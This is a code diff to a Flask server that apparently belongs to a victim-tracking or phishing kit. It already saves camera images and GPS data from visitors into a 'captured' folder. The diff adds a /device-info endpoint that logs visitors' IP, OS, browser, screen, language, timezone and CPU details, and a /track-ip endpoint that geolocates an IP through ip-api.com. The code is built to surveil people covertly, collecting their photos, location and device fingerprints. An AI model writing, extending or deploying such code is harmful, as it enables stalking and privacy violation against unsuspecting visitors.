@@ -12,6 +12,7 @@ CAPTURED_DIR = "captured"
 IMAGES_DIR = os.path.join(CAPTURED_DIR, "images")
 DATA_FILE = os.path.join(CAPTURED_DIR, "data.txt")
 GPS_FILE = os.path.join(CAPTURED_DIR, "gps.txt")
+DEVICE_INFO_FILE = os.path.join(CAPTURED_DIR, "device_info.txt")
 
 os.makedirs(IMAGES_DIR, exist_ok=True)
 
@@ -52,7 +53,6 @@ def capture():
                 f.write(image_bytes)
             image_path = f"/images/{filename}"
 
-            # Auto copy to gallery (HP)
             try:
                 shutil.copy(filepath, f"/sdcard/DCIM/Camera/{filename}")
             except:
@@ -77,6 +77,48 @@ def capture():
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/device-info', methods=['POST'])
+def device_info():
+    try:
+        data = request.json
+        ip = request.remote_addr
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        with open(DEVICE_INFO_FILE, 'a') as f:
+            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+            f.write(f"📅 WAKTU  : {timestamp}\n")
+            f.write(f"🌐 IP     : {ip}\n")
+            f.write(f"🖥️ OS     : {data.get('platform', '-')}\n")
+            f.write(f"🌍 Browser: {data.get('userAgent', '-')[:80]}\n")
+            f.write(f"📱 Layar  : {data.get('screenWidth', '-')}x{data.get('screenHeight', '-')}\n")
+            f.write(f"🗣️ Bahasa : {data.get('language', '-')}\n")
+            f.write(f"🌍 Zona   : {data.get('timezone', '-')}\n")
+            f.write(f"🔢 CPU    : {data.get('hardwareConcurrency', '-')} core\n")
+            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+        
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/track-ip', methods=['POST'])
+def track_ip():
+    try:
+        data = request.json
+        ip = data.get('ip', '')
+        
+        if not ip:
+            return jsonify({"error": "IP tidak ditemukan"})
+        
+        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,timezone,mobile,proxy,hosting")
+        result = response.json()
+        
+        if result.get('status') == 'fail':
+            return jsonify({"error": result.get('message', 'Gagal melacak IP')})
+        
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"error": str(e)})
 
 @app.route('/images/<filename>')
 def serve_image(filename):
